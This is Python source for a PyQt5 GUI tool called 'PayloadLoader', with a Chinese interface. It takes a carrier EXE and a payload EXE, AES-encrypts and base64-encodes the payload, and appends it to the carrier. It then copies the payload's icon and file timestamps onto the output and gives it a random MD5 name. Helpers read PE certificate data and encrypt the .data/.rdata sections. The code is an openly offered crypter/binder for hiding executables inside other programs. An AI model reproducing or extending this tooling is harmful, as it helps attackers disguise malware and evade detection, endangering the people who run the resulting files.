import os
import pefile
import struct
import shutil
import hashlib
import base64
import random
import time
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding


from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *


def safe_move(src, dst):
  
    src_abs = os.path.abspath(src)
    dst_abs = os.path.abspath(dst)
    if src_abs == dst_abs:
        return dst_abs
    if os.path.exists(dst_abs):
        os.remove(dst_abs)
   
    if os.path.splitdrive(src_abs)[0] != os.path.splitdrive(dst_abs)[0]:
        shutil.copy2(src_abs, dst_abs)
        os.remove(src_abs)
    else:
        os.rename(src_abs, dst_abs)
    return dst_abs

def get_sha256(file_path):
  
    h = hashlib.sha256()
    if not os.path.isfile(file_path):
        return ""
    with open(file_path, 'rb') as f:
        while chunk := f.read(65536):
            h.update(chunk)
    return h.hexdigest()

def get_md5(file_path):
  
    h = hashlib.md5()
    if not os.path.isfile(file_path):
        return ""
    with open(file_path, 'rb') as f:
        while chunk := f.read(65536):
            h.update(chunk)
    return h.hexdigest()

def derive_aes_key(raw_key: str) -> bytes:
  
    return hashlib.sha256(raw_key.encode("utf-8")).digest()

def aes_cbc_encrypt(data: bytes, raw_key: str) -> tuple[bytes, bytes]:
    
    key = derive_aes_key(raw_key)
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    cipher_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv, cipher_data

def aes_cbc_decrypt(iv: bytes, cipher_data: bytes, raw_key: str) -> bytes:

    key = derive_aes_key(raw_key)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    unpadder = padding.PKCS7(128).unpadder()
    plain = decryptor.update(cipher_data) + decryptor.finalize()
    return unpadder.update(plain) + unpadder.finalize()

def gather_file_info_win(binary):
    flItms = {'CertLOC': 0, 'CertSize': 0}
    try:
        with open(binary, 'rb') as f:
            f.seek(0x3C)
            pe_off = struct.unpack("<I", f.read(4))[0]
            f.seek(pe_off + 40)
            f.seek(16, os.SEEK_CUR)
            flItms['CertLOC'] = struct.unpack("<I", f.read(4))[0]
            flItms['CertSize'] = struct.unpack("<I", f.read(4))[0]
    except Exception:
        pass
    return flItms

def copy_cert(exe):
    d = gather_file_info_win(exe)
    if d['CertLOC'] == 0 or d['CertSize'] == 0:
        return None
    try:
        with open(exe, 'rb') as f:
            f.seek(d['CertLOC'])
            return f.read(d['CertSize'])
    except Exception:
        return None

def check_digital_signature(exe):
    try:
        pe = pefile.PE(exe)
        has_sign = hasattr(pe, 'DIRECTORY_ENTRY_SECURITY')
        pe.close()
        return has_sign
    except Exception:
        return False

def check_file_integrity(exe):
    return os.path.isfile(exe) and os.access(exe, os.R_OK)


def get_icon_data(pe):
    
    try:
        if not hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
            return None
        
        for res_root in pe.DIRECTORY_ENTRY_RESOURCE.entries:
         
            if res_root.id == pefile.RESOURCE_TYPE['RT_ICON']:
                for lang_entry in res_root.directory.entries:
                    if not lang_entry.directory.entries:
                        continue
                    entry = lang_entry.directory.entries[0]
                   
                    raw_data = entry.data.struct.get_data(pe)
                    return type('IconObj', (), {'data': raw_data})
        return None
    except Exception:
        return None

def generate_md5_filename(file_path: str):
    rand_seed = file_path + str(time.time())
    return hashlib.md5(rand_seed.encode()).hexdigest() + ".exe"


def random_secure_key(length: int) -> str:
    
    char_pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(char_pool) for _ in range(length))


def encrypt_pe_data_section(pe_path: str, save_path: str, key: str):
    
    shutil.copy2(pe_path, save_path)
    pe = pefile.PE(save_path)
    iv_global = os.urandom(16)
    with open(save_path, 'r+b') as fw:
        for sec in pe.sections:
            sec_name = sec.Name.decode().strip('\x00')
           
            if sec_name in (".data", ".rdata", ".idata"):
                ptr = sec.PointerToRawData
                size = sec.SizeOfRawData
                fw.seek(ptr)
                sec_data = fw.read(size)
                
                iv, enc_sec = aes_cbc_encrypt(sec_data, key)
                
                fw.seek(ptr)
                fw.write(enc_sec[:size])
    pe.close()
    return save_path, iv_global

def inject_exe(target, payload, out, key):
    try:
        if not check_file_integrity(target) or not check_file_integrity(payload):
            return False,

        t_pe = pefile.PE(target)
        p_pe = pefile.PE(payload)

        with open(target, 'rb') as f:
            t_data = f.read()
        with open(payload, 'rb') as f:
            p_data = f.read()

      
        iv, enc_payload = aes_cbc_encrypt(p_data, key)
        combine_enc = iv + enc_payload
        b64_enc = base64.b64encode(combine_enc)

        with open(out, 'wb') as o:
            o.write(t_data)
            o.write(b64_enc)
            o.write(struct.pack('<I', len(t_data)))

        icon_entry = get_icon_data(p_pe)
        if icon_entry:
            with open(out, 'ab') as f:
                f.write(icon_entry.data)

        shutil.copystat(payload, out)
        t_pe.close()
        p_pe.close()
        return True, "注入流程执行完成"
    except Exception as e:
        return False, f"注入异常: {str(e)}"


class DarkInjectWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("PayloadLoader")
        self.setMinimumSize(780, 620)
        self.resize(860, 680)
        self.setWindowIcon(QApplication.style().standardIcon(QStyle.SP_FileDialogContentsView))

        self.setStyleSheet("""
            QMainWindow {background-color: #242426; border-radius: 10px;}
            QWidget {color: #f0f0f0; font-family: "Microsoft YaHei UI", SimHei; font-size: 10pt;}
            QGroupBox {border: 1px solid #404044; border-radius: 8px; margin-top: 12px; padding-top: 16px; background-color: #2a2a2d;}
            QGroupBox::title {subcontrol-origin: margin; left: 12px; top: 2px; color: #cccccc; font-weight: bold;}
            QLineEdit {background-color: #36363b; border: 1px solid #4c4c52; border-radius: 6px; padding: 8px 10px; color: #ffffff; selection-background-color: #5078b8;}
            QLineEdit:focus {border: 1px solid #6088d0;}
            QPushButton {background-color: #3c3c42; border: 1px solid #505058; border-radius: 6px; padding: 9px 14px; min-height: 18px;}
            QPushButton:hover {background-color: #4c4c54; border-color: #64646e;}
            QPushButton:pressed {background-color: #323238;}
            #btnInjectStart {background-color: #2d5a38; border: 1px solid #3c784a;}
            #btnInjectStart:hover {background-color: #377045;}
            QTextEdit {background-color: #1e1e20; border: 1px solid #38383d; border-radius: 6px; padding: 8px; font-family: Consolas, monospace; font-size: 9pt;}
            QLabel {color: #dddddd;}
            QFrame[frameShape="4"] {color: #3a3a3f; height: 1px;}
            QRadioButton {color:#ddd;}
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(22, 18, 22, 18)
        main_layout.setSpacing(14)

        title_label = QLabel("EXE")
        title_label.setStyleSheet("font-size:14pt; font-weight:bold; color:#e8e8e8; padding-bottom:4px;")
        main_layout.addWidget(title_label)
        split_line = QFrame()
        split_line.setFrameShape(QFrame.HLine)
        main_layout.addWidget(split_line)

        file_group = QGroupBox("文件路径配置")
        file_layout = QVBoxLayout(file_group)
        file_layout.setContentsMargins(16, 22, 16, 16)
        file_layout.setSpacing(12)

        row_target = QHBoxLayout()
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("选择作为载体的目标EXE文件")
        btn_target = QPushButton("选择载体EXE")
        btn_target.clicked.connect(self.select_target_file)
        row_target.addWidget(QLabel("载体程序："), stretch=0)
        row_target.addWidget(self.target_input, stretch=1)
        row_target.addWidget(btn_target, stretch=0)
        file_layout.addLayout(row_target)

        row_payload = QHBoxLayout()
        self.payload_input = QLineEdit()
        self.payload_input.setPlaceholderText("需要注入的载荷EXE文件")
        btn_payload = QPushButton("选择载荷EXE")
        btn_payload.clicked.connect(self.select_payload_file)
        row_payload.addWidget(QLabel("载荷程序："), stretch=0)
        row_payload.addWidget(self.payload_input, stretch=1)
        row_payload.addWidget(btn_payload, stretch=0)
        file_layout.addLayout(row_payload)

        row_output = QHBoxLayout()
        self.output_input = QLineEdit()
        self.output_input.setPlaceholderText("输出合成后的EXE保存路径")
        btn_output = QPushButton("设置输出路径")
        btn_output.clicked.connect(self.select_output_path)
        row_output.addWidget(QLabel("输出文件："), stretch=0)
        row_output.addWidget(self.output_input, stretch=1)
        row_output.addWidget(btn_output, stretch=0)
        file_layout.addLayout(row_output)
        main_layout.addWidget(file_group)

        
        key_group = QGroupBox("AES加密密钥设置")
        key_layout = QVBoxLayout(key_group)
        key_layout.setContentsMargins(16, 22, 16, 16)
        key_layout.setSpacing(10)

        
        radio_layout = QHBoxLayout()
        self.radio_16 = QRadioButton("16位随机密钥")
        self.radio_32 = QRadioButton("32位随机密钥")
        self.radio_32.setChecked(True) # 默认32位
        radio_layout.addWidget(self.radio_16)
        radio_layout.addWidget(self.radio_32)
        radio_layout.addStretch()
        key_layout.addLayout(radio_layout)

        
        key_input_layout = QHBoxLayout()
        self.key_input = QLineEdit()
        self.key_input.setPlaceholderText("自定义加密密钥（或点击右侧随机生成）")
        btn_gen_key = QPushButton("随机生成密钥")
        btn_gen_key.clicked.connect(self.generate_random_key)
        key_input_layout.addWidget(self.key_input, stretch=1)
        key_input_layout.addWidget(btn_gen_key, stretch=0)
        key_layout.addLayout(key_input_layout)

        main_layout.addWidget(key_group)

        btn_layout = QHBoxLayout()
        btn_layout.addStretch()
        self.btn_start = QPushButton("✅ 开始加密注入")
        self.btn_start.setObjectName("btnInjectStart")
        self.btn_start.setFixedWidth(180)
        self.btn_start.clicked.connect(self.run_inject_task)
        btn_layout.addWidget(self.btn_start)
        btn_layout.addStretch()
        main_layout.addLayout(btn_layout)

        log_group = QGroupBox("运行日志")
        log_layout = QVBoxLayout(log_group)
        log_layout.setContentsMargins(16, 22, 16, 16)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        main_layout.addWidget(log_group)

   
    def generate_random_key(self):
        length = 32 if self.radio_32.isChecked() else 16
        new_key = random_secure_key(length)
        self.key_input.setText(new_key)
        self.log_print(f"[生成密钥] 已生成{length}位随机密钥", color="#9cf0ff")

    def select_target_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "选择载体EXE", "", "可执行文件 (*.exe)")
        if path:
            self.target_input.setText(path)
            self.log_print(f"[INFO] 已加载载体文件: {path}", color="#dddddd")

    def select_payload_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "选择载荷EXE", "", "可执行文件 (*.exe)")
        if path:
            self.payload_input.setText(path)
            self.log_print(f"[INFO] 已加载载荷文件: {path}", color="#dddddd")

    def select_output_path(self):
        path, _ = QFileDialog.getSaveFileName(self, "输出合成EXE", "output.exe", "可执行文件 (*.exe)")
        if path:
            self.output_input.setText(path)
            self.log_print(f"[INFO] 设置输出路径: {path}", color="#dddddd")

    def log_print(self, msg: str, color="#ffffff"):
        html = f'<span style="color:{color}">{msg}</span>'
        self.log_text.append(html)
        QApplication.processEvents()

    def run_inject_task(self):
        target = self.target_input.text().strip()
        payload = self.payload_input.text().strip()
        output = self.output_input.text().strip()
        key = self.key_input.text().strip()

        if not target:
            self.log_print("[-] 错误：请选择载体EXE文件", color="#ff6b6b")
            return
        if not payload:
            self.log_print("[-] 错误：请选择载荷EXE文件", color="#ff6b6b")
            return
        if not output:
            self.log_print("[-] 错误：请设置输出保存路径", color="#ff6b6b")
            return
        if not key:
            self.log_print("[-] 错误：请输入AES加密密钥，可点击随机生成", color="#ff6b6b")
            return

        self.log_print("=" * 60, color="#888888")
        self.log_print(f"[*] 载体：{target}", color="#a0d8ff")
        self.log_print(f"[*] 载荷：{payload}", color="#a0d8ff")
        self.log_print(f"[*] 输出路径：{output}", color="#a0d8ff")
        self.log_print("[*] 正在执行加密注入流程...", color="#ffdd70")

        temp_out = output
        if os.path.exists(temp_out):
            temp_out = generate_md5_filename(output)
            self.log_print(f"[!] 输出文件已存在，自动生成临时文件名: {temp_out}", color="#ffdd70")

        ok, msg = inject_exe(target, payload, temp_out, key)
        if ok:
            
            final_name = hashlib.md5(os.urandom(16)).hexdigest() + ".exe"
            final_full_path = safe_move(temp_out, final_name)
            md5_hash = get_md5(final_full_path)
            self.log_print("[+] ==================== 注入成功 ====================", color="#69ff94")
            self.log_print(f"[+] 生成成品文件: {final_full_path}", color="#69ff94")
            self.log_print(f"[+] 文件MD5: {md5_hash}", color="#69ff94")
            self.log_print("[提示] 如需加密载体区段(.data/.rdata)，调用 encrypt_pe_data_section 函数", color="#ffdd70")
        else:
            self.log_print(f"[-] 注入失败: {msg}", color="#ff6b6b")


if __name__ == "__main__":
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling)
    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps)

    app = QApplication(sys.argv)
    window = DarkInjectWindow()
    window.show()
    sys.exit(app.exec_())
